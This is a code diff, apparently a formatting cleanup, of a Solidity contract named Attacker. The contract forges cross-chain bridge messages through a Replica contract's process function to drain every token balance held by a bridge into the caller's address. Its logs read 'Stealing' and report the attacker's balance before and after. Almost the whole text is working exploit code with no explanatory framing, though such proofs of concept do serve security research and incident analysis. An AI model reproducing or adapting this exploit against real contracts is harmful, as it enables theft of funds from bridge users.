@@ -31,10 +31,17 @@ contract Attacker {
     function attack() external {
         for (uint i = 0; i < tokens.length; i++) {
             address token = tokens[i];
-            uint256 amount_bridge = IERC20(token).balanceOf(ERC20_BRIDGE);
+            uint256 amount_bridge = ERC20(token).balanceOf(ERC20_BRIDGE);
 
-            console.log("[*] Stealing", amount_bridge / 10**ERC20(token).decimals(), ERC20(token).symbol());
-            console.log("    Attacker balance before:", ERC20(token).balanceOf(msg.sender));
+            console.log(
+                "[*] Stealing",
+                amount_bridge / 10**ERC20(token).decimals(),
+                ERC20(token).symbol()
+            );
+            console.log(
+                "    Attacker balance before:",
+                ERC20(token).balanceOf(msg.sender)
+            );
 
             // Generate the payload with all of the tokens stored on the bridge
             bytes memory payload = genPayload(msg.sender, token, amount_bridge);
@@ -42,13 +49,19 @@ contract Attacker {
             bool success = IReplica(REPLICA).process(payload);
             require(success, "Failed to process the payload");
 
-            console.log("    Attacker balance after: ", IERC20(token).balanceOf(msg.sender) / 10**ERC20(token).decimals());
+            console.log(
+                "    Attacker balance after: ",
+                IERC20(token).balanceOf(msg.sender) / 10**ERC20(token).decimals()
+            );
         }
     }
 
-    function genPayload(address recipient, address token, uint256 amount) internal pure returns (bytes memory) {
-
-        bytes memory payload = abi.encodePacked(
+    function genPayload(
+        address recipient,
+        address token,
+        uint256 amount
+    ) internal pure returns (bytes memory payload) {
+        payload = abi.encodePacked(
             MOONBEAM,                           // Home chain domain
             uint256(uint160(BRIDGE_ROUTER)),    // Sender: bridge
             uint32(0),                          // Dst nonce
@@ -70,7 +83,5 @@ contract Attacker {
                                                 //     )
                                                 // ) 
         );
-
-        return payload;
     }
 }
